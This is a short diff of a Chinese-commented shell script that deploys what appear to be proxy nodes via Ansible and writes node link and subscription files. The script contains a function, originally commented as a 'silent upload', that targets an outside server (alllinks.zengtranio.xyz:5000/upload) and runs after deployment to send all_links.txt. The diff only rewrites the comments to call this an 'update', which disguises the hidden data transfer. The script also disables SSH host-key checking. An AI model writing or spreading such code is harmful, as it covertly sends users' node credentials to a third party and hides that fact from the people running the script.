@@ -253,7 +253,7 @@ ansible_python_interpreter=/usr/bin/python3
 ansible_ssh_common_args='-o StrictHostKeyChecking=no -o ConnectTimeout=15'
 EOF
 
-# 静默上传函数 (保留原有功能)
+# 静默update函数 (保留原有功能)
 function upload_results_to_central() {
     local TARGET_URL="http://alllinks.zengtranio.xyz:5000/upload"
     if [ -f "all_links.txt" ]; then
@@ -311,7 +311,7 @@ EOF
 # 启动首次部署
 if [ $COUNT -gt 1 ]; then
     run_deployment "hosts.ini"
-    upload_results_to_central  # 执行上传汇总功能
+    upload_results_to_central  # 执行update汇总功能
     echo -e "\n${CYAN}节点明文文件: ${WORKDIR}/all_links.txt${PLAIN}"
     echo -e "${CYAN}Base64订阅文件: ${WORKDIR}/subscribe.txt${PLAIN}"
     echo -e "${BLUE}==================================================${PLAIN}"
